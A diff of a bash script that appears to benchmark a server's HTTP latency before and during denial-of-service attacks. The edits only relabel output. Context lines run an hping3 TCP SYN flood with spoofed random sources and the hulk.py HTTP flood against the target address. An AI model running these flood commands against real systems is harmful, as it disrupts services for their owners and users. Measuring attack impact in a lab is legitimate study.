@@ -7,7 +7,7 @@ pingu()
 	PRINT=$3
 	echo "Calculating time to $IP... "
 	httping $IP -c $REP > temp_httping.txt
-	echo "$PRINT " `tail -n 1 temp_httping.txt | awk '{print $4}' | cut -d"/" -f2`
+	#echo "$PRINT " `tail -n 1 temp_httping.txt | awk '{print $4}' | cut -d"/" -f2`
 	media=$(tail -n 1 temp_httping.txt | awk '{print $4}' | cut -d "/" -f2)
 	min=$(tail -n 1 temp_httping.txt | awk '{print $4}' | cut -d "/" -f1)
     max=$(tail -n 1 temp_httping.txt | awk '{print $4}' | cut -d "/" -f3)
@@ -28,8 +28,9 @@ pingu()
 	    fi
 	done < "temp_httping.txt"
 	n=$(($REP-1))
-    #echo "$n"
+    echo "$PRINT"
     echo "Minimo: $min"
+    echo "Media: $media"
     echo "Maximo: $max"
 	variancia=$(($acum/$n))
     echo "variancia: $variancia"
@@ -58,7 +59,7 @@ do
 	fi
 done
 
-pingu $IP $REP "Average time (in ms):"
+pingu $IP $REP "Time without attack (in ms):"
 
 
 echo ""
@@ -69,7 +70,7 @@ sleep 5
 echo "GO!"
 xterm -e "sudo hping3 -c 15000 -d 120 -S -w 512 -p 80 --flood --rand-source $IP" &
 sleep 5
-pingu $IP $REP "Average time with TCP SYN FLOOD (in ms):"
+pingu $IP $REP "Time with TCP SYN FLOOD (in ms):"
 
 sleep 10
 
@@ -80,7 +81,7 @@ echo "Smash!"
 
 xterm -e "python hulk.py $IP" &
 sleep 3
-pingu $IP $REP "Average time with Flooding (in ms):"
+pingu $IP $REP "Time with Flooding (in ms):"
 bash hulk-buster.sh
 
 
